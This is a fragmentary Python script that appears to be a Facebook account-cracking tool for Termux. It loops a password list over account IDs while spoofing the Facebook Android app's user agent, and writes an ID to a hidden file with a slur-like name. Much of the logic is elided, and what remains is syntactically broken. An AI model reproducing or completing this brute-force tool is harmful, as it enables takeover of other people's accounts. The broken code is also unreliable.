...
def m2(ids,names,passlist):
    ...
    try:
        ...
        for pw in passlist:
            ...
            headers={
                    'User-Agent': f"[FBAN/EMA;FBAV/422.0.0.70.235;FBPN/com.facebook.katana;FBLC/en_US;FBBV/854904774;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBDV/Galaxy A33 5G;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
              'Content-Type': 'application/x-www-form-urlencoded', 
...
try:
  ...
  kok=open('/data/data/com.termux/files/usr/bin/.nigs.txt', 'w')
  kok.write(myid+imt)
  kok.close()
async def key():
